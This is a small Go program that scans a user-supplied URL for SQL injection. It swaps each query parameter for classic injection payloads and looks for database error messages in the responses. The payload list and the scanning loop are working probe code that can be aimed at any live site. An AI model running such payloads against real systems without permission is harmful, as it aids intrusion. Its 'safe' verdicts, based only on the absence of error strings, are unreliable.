package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)



var payloads = []string{
	"'",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"'--",
	"' OR 1=1 --",
}

var errorIndicators = []string{
	"SQL syntax",
	"mysql_fetch",
	"ORA-01756",
	"ODBC",
	"unexpected token",
	"Warning: ",
	"Unclosed quotation mark",
	"quoted string not properly terminated",
}

func isVulnerable(body string) bool{
	for _, indicator := range errorIndicators{
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)){
			return  true
		}
	}
	return  false
}

func scanURL(baseURL string){
	parsedURL, err := url.Parse(baseURL)
	if err != nil{
		fmt.Println("Invalid url: ", err)
		return
	}

	params := parsedURL.Query()
	if len(params) == 0 {
		fmt.Println("Url doesnt contains params")
		return
	}
	for key := range params {
		original := params.Get(key)
		for _, payload := range payloads {
			params.Set(key, payload)
			parsedURL.RawQuery = params.Encode()

			resp, err := http.Get(parsedURL.String())
			if err != nil {
				fmt.Println("Eroare request:", err)
				continue
			}
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			body := string(bodyBytes)

			if isVulnerable(body) {
				fmt.Printf("🔥 POTENȚIAL VULNERABIL: Parametru `%s` cu payload `%s`\n", key, payload)
				fmt.Printf("   -> %s\n", parsedURL.String())
			} else {
				fmt.Printf("✅ Sigur: %s=%s\n", key, payload)
			}
			params.Set(key, original) // reset la valoarea originală
		}
	}
}

func main() {
	var target string
	fmt.Print("Introdu URL de testat (cu parametri): ")
	fmt.Scanln(&target)

	scanURL(target)
}